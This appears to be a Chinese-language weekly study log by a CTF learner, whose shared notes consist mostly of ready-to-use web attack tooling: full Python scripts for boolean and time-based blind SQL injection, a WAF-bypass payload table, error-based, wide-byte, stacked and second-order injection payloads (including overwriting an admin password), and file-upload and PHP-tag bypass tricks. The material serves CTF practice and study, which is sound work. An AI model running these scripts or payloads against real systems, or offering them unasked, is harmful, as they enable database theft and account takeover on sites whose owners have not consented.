# 完成事项

+ ## web方面
  
  1. 完成了upload-labs Pass01~20
  
  2. 总结了sql注入和文件上传漏洞的大部分知识点

----

# 下周待做事项

1. 学习SSRF的知识点并总结

2. 学习LFI的知识点并总结

3. 完成sqli-labs的全部题目

---

# 本周学习的知识分享

+ 布尔盲注通用工程化脚本
  
  第一种，二分法
  
  ```python
  import requests
  
  # 1.改url
  # 2.改成功标识
  # 3.改sql语句
  # 4.改闭合方式
  # 5.改参数名和请求方式。
  
  # --- [1. 配置区] ---
  url = 'http://[题目IP]:[端口]/'  # 例子：http://node4.anna.nssctf.cn:28264/
  
  # [关键] 成功标识：当 SQL 条件为真时，页面返回的特征
  # 如果成功时页面包含 "admin"，就填 "admin"
  # 如果成功时页面长度变长，请修改底下的 if 判断逻辑
  success_mark = "[成功时出现的字符串]" 
  # ----------------
  
  flag = ""
  print("[-] 开始布尔盲注 (二分法)...")
  
  for i in range(1, 100): # 假设 flag 长度不超过 100
      low = 32
      high = 128
  
      while low < high:
          mid = (low + high) >> 1
  
          # --- [2. SQL 构造区 (核心填空)] ---
          # 请根据当前进度，取消注释你需要的那一行，并修改中文部分
  
          # 【阶段A：查当前数据库名】
          # sql = f"ascii(substr(database(),{i},1))>{mid}"
  
          # 【阶段B：查表名】 (修改 limit 0,1 拿第1个表，limit 1,1 拿第2个)
          # sql = f"ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{i},1))>{mid}"
  
          # 【阶段C：查列名】 (修改 [表名] 为实际表名)
          # sql = f"ascii(substr((select column_name from information_schema.columns where table_name='[表名]' limit 0,1),{i},1))>{mid}"
  
          # 【阶段D：查数据 (战术三板斧 - 三选一)】
          # ---------------------------------------------------
          # 战术1 (首选): 全网打尽法 - group_concat (一次拿全，不需要管在哪一行)
          sql = f"ascii(substr((select group_concat([列名]) from [表名]),{i},1))>{mid}"
  
          # 战术2 (精准): 狙击法 - LIKE (已知Flag格式，无需知道用户名)
          # sql = f"ascii(substr((select [列名] from [表名] where [列名] like 'ctf%'),{i},1))>{mid}"
  
          # 战术3 (兜底): 指定用户法 (已知 用户名列='flag' 或 'admin')
          # sql = f"ascii(substr((select [列名] from [表名] where [用户名列]='[目标用户名]'),{i},1))>{mid}"
          # ---------------------------------------------------
  
          # --- [3. Payload 包装区 (闭合方式)] ---
          # 请根据手工测试结果，修改下面的payload
  
          # 修改闭合方式
          final_payload = f"1 and if({sql}, 1, 0) -- -"
  
          # 发送请求
          try:
              # GET 请求：
              params = {'id': final_payload} # 如果参数名不是 id，请修改这里
              r = requests.get(url, params=params)
  
              # POST 请求 (如登录框，请取消注释下面并注释上面)：
              # data = {'username': final_payload, 'password': '123'}
              # r = requests.post(url, data=data)
  
              # 判断逻辑 (默认判断字符串是否存在)
              if success_mark in r.text:
                  low = mid + 1
              else:
                  high = mid
  
          except Exception as e:
              print(f"[!] 网络错误，正在重试... {e}")
              continue
  
      if low == 32: # 32是空格，通常意味着数据结束
          break
  
      flag += chr(low)
      print(f"[*] Current Flag: {flag}")
  
  print(f"\n[+] Final Flag: {flag}")
  ```
  
  第二种，字典遍历
  
  ```python
  import requests
  import concurrent.futures
  import sys
  
  
  # 【CTF 多线程字典爆破盲注脚本 - LIKE/REGEXP 专用】
  # 适用场景：无法使用 > < 比较大小，只能用 LIKE 'flag%' 进行逐位匹配的情况。
  # 原理：开启 20-50 个线程，同时猜测下一位字符是 a? b? c? ... 谁返回 True 谁就是对的。
  
  #1.修改url
  #2.修改成功标识
  #3.改爆破字典（可能）
  #4.改payload
  #5.改参数名和请求方式
  #6.改flag头
  
  
  # --- [1. 配置区] ---
  url = 'http://[题目IP]:[端口]/'
  
  # [关键] 成功标识：当猜测正确时，页面会出现的字符串
  success_mark = "[成功标识]" 
  
  # [关键] 爆破字典：包含 Flag 可能出现的所有字符
  # 如果 Flag 只有数字，可以改成 '0123456789' 提速
  chars = '0123456789abcdefghijklmnopqrstuvwxyz-{}'
  # ----------------
  
  def check(current_flag, char):
      """
      线程工作函数：检测加上某个字符后，是否正确
      """
      # 拼接猜测：已知的flag + 正在猜的这个字符
      guess = current_flag + char
  
      # --- [2. Payload 构造区 (核心)] ---
      # 场景：利用 LIKE 进行前缀匹配
      # [当前猜测Str] 会被替换为像 ctfshow{a 这样的字符串
      # 注意：根据题目过滤情况，可能需要用 () 代替空格，或用 hex 编码
  
      # 模板 A：标准 LIKE 注入
      # payload = f"1' and password like '{guess}%' -- -"
  
      # 模板 B：题目特定绕过 (如 select-waf 这题)
      # payload = f"(ctfshow_user)where(pass)like'{guess}%'"
  
      # 模板 C：使用 16 进制绕过单引号 (推荐)
      # hex_guess = "0x" + guess.encode().hex() + "%" # 把猜测转成 16 进制并在末尾加通配符%
      # payload = f"1' and password like {hex_guess} -- -"
  
      # 这里填入你最终选定的 payload:
      payload = f"[填入Payload]" 
      # -------------------------------
  
      # 发送请求 (根据 GET/POST 修改)
      try:
          # POST 方式：
          data = {'[参数名]': payload}
          r = requests.post(url, data=data, timeout=5)
  
          # GET 方式 (注释上面，取消下面)：
          # params = {'[参数名]': payload}
          # r = requests.get(url, params=params, timeout=5)
  
          # 判断逻辑
          if success_mark in r.text:
              return char
  
      except Exception as e:
          pass
  
      return None
  
  def main():
      # [3. 初始设置]
      # 如果你知道 Flag 以 ctfshow{ 开头，这里直接填，能省很多时间
      flag = "ctfshow{" 
  
      print(f"[*] 开始多线程盲注，当前进度: {flag}")
  
      while True:
          found_char = None
  
          # 开启线程池 (max_workers 可以开到 20-50)
          with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
              future_to_char = {
                  executor.submit(check, flag, c): c for c in chars
              }
  
              for future in concurrent.futures.as_completed(future_to_char):
                  result = future.result()
                  if result:
                      found_char = result
                      executor.shutdown(wait=False, cancel_futures=True)
                      break
  
          if found_char:
              flag += found_char
              # 实时刷新显示
              sys.stdout.write(f"\r[+] Found: {flag}")
              sys.stdout.flush()
  
              # 结束条件：如果探测到了右大括号 (根据实际情况修改)
              if found_char == '}':
                  print(f"\n\n[Success] 最终 Flag: {flag}")
                  break
          else:
              print("\n[!] 未找到匹配字符，脚本停止。")
              break
  
  if __name__ == '__main__':
      main()
  ```

+ 布尔盲注通用工程化脚本
  
  ```python
  import requests
  import time
  
  #1.改url
  #2.改时间阈值（一般不改）
  #3.sql语句
  #4.改闭合方式
  #5.改参数名和请求方式
  
  # --- [1. 配置区] ---
  url = 'http://[题目IP]:[端口]/'
  
  # [关键] 睡眠时间设置 (单位：秒)
  # 建议：SLEEP_TIME 必须大于 TIMEOUT_SETTING (推荐 3秒 vs 2秒)
  SLEEP_TIME = 3
  TIMEOUT_SETTING = 2
  # ----------------
  
  flag = ""
  print(f"[-] 开始时间盲注 (Sleep: {SLEEP_TIME}s, Timeout: {TIMEOUT_SETTING}s)...")
  
  for i in range(1, 100):
      low = 32
      high = 128
  
      while low < high:
          mid = (low + high) >> 1
  
          # --- [2. SQL 构造区 (核心填空)] ---
  
          # 【阶段A：查库名】
          # sql = f"ascii(substr(database(),{i},1))>{mid}"
  
          # 【阶段B：查表名】
          # sql = f"ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{i},1))>{mid}"
  
          # 【阶段C：查列名】
          # sql = f"ascii(substr((select column_name from information_schema.columns where table_name='[表名]' limit 0,1),{i},1))>{mid}"
  
          # 【阶段D：查数据 (战术三板斧)】
          # 战术1: group_concat (全拿)
          sql = f"ascii(substr((select group_concat([列名]) from [表名]),{i},1))>{mid}"
  
          # 战术2: LIKE 'flag%' (狙击)
          # sql = f"ascii(substr((select [列名] from [表名] where [列名] like 'ctf%'),{i},1))>{mid}"
  
          # 战术3 (兜底): 指定用户法 (已知 用户名列='flag' 或 'admin')
          # sql = f"ascii(substr((select [列名] from [表名] where [用户名列]='[目标用户名]'),{i},1))>{mid}"
  
          # -----------------------
  
          # --- [3. Payload 包装区] ---
          # 核心逻辑：if(条件, sleep(T), 0)
  
          # 修改闭合方式
          final_payload = f"1 and if({sql}, sleep({SLEEP_TIME}), 0) -- -"
  
          try:
              params = {'id': final_payload} # 如果参数名不是 id，请修改这里
  
              # 发送请求 (核心：timeout)
              requests.get(url, params=params, timeout=TIMEOUT_SETTING)
  
              # [逻辑分支 A] 没超时 -> sleep 没执行 -> 条件为假
              high = mid
  
          except requests.exceptions.ReadTimeout:
              # [逻辑分支 B] 超时了 -> sleep 执行了 -> 条件为真
              low = mid + 1
  
          except Exception as e:
              print(f"[!] 网络异常 (非超时): {e}")
              continue
  
      if low == 32:
          break
  
      flag += chr(low)
      print(f"[*] Current Flag: {flag}")
  
  print(f"\n[+] Final Flag: {flag}")
  ```

+ WAF Bypass 
  
  | **被过滤项**                | **替代方案 / Payload**      | **备注 (适用场景)**                             |
  | ----------------------- | ----------------------- | ----------------------------------------- |
  | **空格 (Space)**          | /**/                    | 内联注释，最通用                                  |
  |                         | %09, %0a, %0b, %0c, %0d | URL编码的空白符 (Tab, 换行等)                      |
  |                         | () 包裹                   | 如 select(database())from(users)           |
  | **注释符 (--+, #)**        | %23                     | # 的 URL 编码                                |
  |                         | ;%00                    | 空字节截断 (很少见)                               |
  |                         | **手动闭合 (最稳)**           | 构造 '1 来闭合后端的 ' (如 union select 1,'2)      |
  | **等号 (=)**              | LIKE                    | 如 id like 1 (最常用)                         |
  |                         | RLIKE, REGEXP           | 正则匹配                                      |
  |                         | IN                      | 如 id in (1)                               |
  |                         | < , >                   | 二分法盲注专用                                   |
  | **逻辑词 (AND, OR)**       | && (%26%26)             | 替代 AND                                    |
  |                         | `                       |                                           |
  |                         | ^ (%5e)                 | 异或 (XOR)，有时可替代 OR                         |
  | **逗号 (,)**              | FROM x FOR y            | 用于 substr (如 substr(user() from 1 for 1)) |
  |                         | OFFSET                  | 用于 limit (如 limit 1 offset 0)             |
  |                         | JOIN                    | 用于 union (复杂，很少用)                         |
  | **关键字 (UNION, SELECT)** | /*!UNION*/              | 内联注释 (MySQL 版本号特性)                        |
  |                         | /*!50000UNION*/         | 带版本号的内联注释 (干扰更强)                          |
  |                         | UnIoN                   | 大小写绕过 (针对弱正则)                             |
  |                         | unUNIONion              | 双写绕过 (针对 str_replace)                     |
  | **单引号 (')**             | 0x... (十六进制)            | 如 username=0x61646d696e (admin)           |
  |                         | 宽字节 (%df')              | 针对 GBK 编码                                 |

+ 用group by ... having ... 替代where

+ MySQL 报错注入
  
  1. XML 函数 (最常用，MySQL 5.1.5+)
     
     ```sql
     and extractvalue(1, concat(0x7e, ([查询语句]), 0x7e))
     ```
     
     ```sql
     and updatexml(1, concat(0x7e, ([查询语句]), 0x7e), 1)
     ```
  
  2. 主键冲突 (Floor 报错)
     
     ```sql
     and (select 1 from (select count(*), concat(([查询语句]), 0x7e, floor(rand(0)*2)) as x from information_schema.tables group by x) as a)
     ```

+ 宽字节注入
  
  ```sql
  -- 输入 %df'
  -- 后端转义后： %df\'  ->  %df%5c%27
  -- GBK 解析：   ( %df%5c ) + %27  ->  汉字 + '
  -- 结果：报错 (Syntax Error)，说明单引号成功逃逸
  ?id=1%df'
  ```

+ 堆叠注入
  
  1. 移花接木法
     
     ```sql
     -- 1. 把那个碍事的 [默认表] 改个名字腾地方
     [闭合]; rename table [默认表] to [默认表_bak];
     
     -- 2. 把 [Flag表] 改名为 [默认表] (鸠占鹊巢)
     rename table [Flag表] to [默认表];
     
     -- 4. 查找列名
     show columns from [表名];
     
     -- 3. 修改列名 (关键！)
     -- 后台查询语句查的是 id 列，但 Flag表里可能叫 flag_data。
     -- 必须把列名也改了，不然后台查不到 id 会报错。
     alter table [默认表] change [Flag列名] [默认列名] varchar(100); --+
     ```
  
  2. Handler 句柄法 (MySQL 专属)
     
     ```sql
     -- 1. 打开表
     [闭合]; handler [Flag表名] open;
     
     -- 2. 读取第一行
     handler [Flag表名] READ FIRST;
     
     -- 3. 读取下一行 (如果 Flag 不在第一行，就多读几次)
     HANDLER [Flag表名] READ NEXT;
     
     -- 4. 关闭表
     HANDLER [Flag表名] CLOSE; --+
     ```
  
  3. 预处理语句
     
     ```sql
     -- 定义变量 @sql，内容是 hex 编码后的查询语句
     [闭合]; SET @sql = 0x73656c656374202a2066726f6d20666c6167; 
     
     -- 预处理
     PREPARE stmt FROM @sql;
     
     -- 执行
     EXECUTE stmt;
     
     -- 释放
     DEALLOCATE PREPARE stmt; --+
     ```

+ 二次注入
  
  **Step 1: 注册“炸弹”账号 (Injection)**
  
  * **操作**：注册新用户。
  
  * **用户名**：admin'#
    
    * 注：如果过滤了 #，尝试 admin' --+
  
  * **密码**：任意（如 123）。
  
  **Step 2: 登录并引爆 (Trigger)**
  
  * **操作**：使用刚才注册的 admin'# / 123 登录系统。
  
  * **触发点**：找到 **修改密码** 或 **重置密码** 功能。
  
  * **动作**：将密码修改为 123456（或任意已知密码）。
  
  **Step 3: 验证战果 (Verification)**
  
  * **操作**：注销当前账号。
  
  * **尝试**：使用目标账号 **admin** 和新密码 **123456** 登录。
  
  * **结果**：如果登录成功，说明管理员密码已被覆盖。

+ 文件上传流程
  
  * **先看服务器**：
    
    1. **Nginx** -> 优先测 .user.ini。
    
    2. **Apache** -> 优先测 .htaccess。
    
    3. **Windows** -> 优先测 . 和 ::$DATA。
  
  * **再看白名单**：
    
    1. **有包含点** -> 图片马 + 伪协议。
    
    2. **老版本 PHP** -> 00 截断。
  
  * **最后看逻辑**：
    
    1. **秒删** -> 条件竞争。
    
    2. **渲染** -> 二次渲染脚本。

+ PHP 标签绕过 (内容过滤)
  
  如果服务器过滤了 <?php：
  
  * <?= 'hello'; ?>
    
     (短标签，不需要 short_open_tag=On)
  
  * <script language="php"> ... </script> (PHP 7 以下)
  
  * <% ... %> (ASP 风格，需开启 asp_tags)

---

# 本周学习总结

争取一星期内把笔记整理好
